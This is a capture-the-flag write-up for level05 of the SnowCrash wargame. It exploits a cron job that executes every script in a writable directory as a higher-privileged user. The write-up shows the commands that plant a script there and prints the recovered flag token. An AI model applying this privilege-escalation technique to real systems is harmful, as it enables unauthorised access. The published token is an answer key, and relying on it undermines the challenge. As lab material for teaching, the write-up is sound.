# level05

1. Files found in `~/` : none

- Information received at connection :

```bash
You have new mail.
```

2. Mailbox analysis

```bash
level05@SnowCrash:~$ ls -l /var/mail/level05
-rw-r--r--+ 1 root mail 58 Oct 7 08:14 /var/mail/level05
```

The `level05` mailbox contains a cron entry indicating that `/usr/sbin/openarenaserver` is executed every 2 minutes as user `flag05`.

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Verification of the `/usr/sbin/openarenaserver` binary :

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

It executes **all** scripts present in `/opt/openarenaserver/` then deletes each script after execution.

3. Exploitation

Create `/opt/openarenaserver/script.sh` containing `getflag > /tmp/token` and make the file executable :

```bash
echo 'getflag > /tmp/token' > /opt/openarenaserver/script.sh
chmod +x /opt/openarenaserver/script.sh
```

During the next service execution, `getflag` was launched as `flag05` and wrote the token to `/tmp/token`.

```bash
level05@SnowCrash:/$ cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

4. Token discovered

The token is : `viuaaale9huek52boumoomioc`
